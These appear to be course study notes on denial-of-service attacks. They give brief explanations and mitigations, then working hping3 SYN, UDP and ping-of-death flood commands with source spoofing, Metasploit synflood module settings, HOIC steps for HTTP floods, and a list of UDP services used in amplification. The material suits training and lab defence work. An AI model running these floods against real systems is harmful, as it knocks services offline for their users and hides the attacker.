# 10 - DoS

## Module 10 - Denial-of-Service

## **SYN Flooding**

**SYN flooding** is a type of cyberattack that targets a server by overwhelming it with a flood of fake or incomplete connection requests (SYN packets). These requests are part of the 3-way handshake process used to establish a connection between a client and a server. In a SYN flood attack, the attacker sends a large number of SYN packets without completing the handshake, tying up the server's resources and preventing it from servicing legitimate connections.

This can lead to a denial of service (DoS) or distributed denial of service (DDoS) attack, causing the server to become unresponsive. Mitigation strategies include rate limiting, SYN cookies, and deploying intrusion detection and prevention systems.

### **Perform a SYN Flooding on a Target Host using hping3**

**Target:**

* Wireshark-\&gt;Ethernet

#### **Attacker**

* **hping3 -S \<Target IP> -a \<Spoofable IP> -p \<Port to flood> -flood**
  * **-S: Set the SYN flag**
  * **-a: Spoof the IP address**
  * **-p: Specify the destination port, e.g 22**
  * **--flood: Send a huge number of packets**

#### **Target**

* Check wireshark

#### **Attacker (Perform PoD)**

* **hping3 -d 65538 -S -p 21 –flood \<Target IP>**
  * **-d: Specify data size**
  * **-S: Set the SYN flag**

#### **Attacker (Perform UDP application layer flood attack)**

* nmap -p 139 10.10.10.19 (check service)
* **hping3 -2 -p 139 –flood \<Target IP>**
  * **-2: Specify UDP mode**

### **SYN Flooding using Metasploit**

```bash
nmap -p 21 10.10.10.10 #check open ports or specific port

msfconsole -q #start msfconsole
use auxiliary/dos/tcp/synflood #SYN Flooding module
set RHOST <Target IP>
set RPORT 21
set SHOST <Spoofed IP Address> #Our fake IP 
set TIMEOUT 20000 and press Enter

#open Wireshark and View Flood attack on victim via Wireshark, use filter:
tcp.port=21
```

## HTTP Flooding Attack

**HTTP flood attack**, is a type of cyberattack aimed at overwhelming a web server by sending a massive volume of HTTP requests. These requests often mimic legitimate user interactions with a website, such as GET or POST requests for web pages or resources. The intent is to consume the server's resources, exhaust its processing capacity, and cause it to become slow or unresponsive, resulting in a denial of service (DoS) situation.

Attackers may employ botnets or distributed networks of compromised devices to intensify the attack. Defenses against HTTP flooding include rate limiting, traffic analysis, and content delivery networks (CDNs) to absorb excess traffic and protect the target server.

### HTTP Flooding Attack using HOIC (High Orbit Ion Cannon)

* Open HOIC.
* Set threads = 20
* Click + to add target
* Enter Target http://\<Target IP> -> Power = High -> Booster = GenericBoost.hoic
* Click **FIRE TEH LAZER!** to launch attack

#### **Other UDP-based applications and their ports**

* CharGen UDP Port 19
* SNMPv2 UDP Port 161
* QOTD UDP Port 17
* RPC UDP Port 135
* SSDP UDP Port 1900
* CLDAP UDP Port 389
* TFTP UDP Port 69
* NetBIOS UDP Port 137,138,139
* NTP UDP Port 123
* Quake Network Protocol UDP Port 26000
* VoIP UDP Port 5060
